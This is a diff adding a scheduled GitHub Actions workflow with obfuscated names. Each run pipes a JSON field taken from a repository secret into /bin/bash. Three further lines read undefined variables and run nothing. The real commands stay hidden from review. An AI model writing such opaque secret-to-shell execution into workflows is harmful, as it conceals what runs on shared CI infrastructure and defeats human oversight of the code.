@@ -1,0 +1,21 @@
+name: daitoudag2
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: daitoudag2
+        env:
+          s97: ${{ secrets.s97 }}
+        run: |
+          echo $s97 | jq -r .i70 | /bin/bash
+          echo $ic3093 | jq -r .v67 | /bin/bash
+          echo $az0081 | jq -r .h3 | /bin/bash
+          echo $feiod65 | jq -r .hz3690 | /bin/bash
+
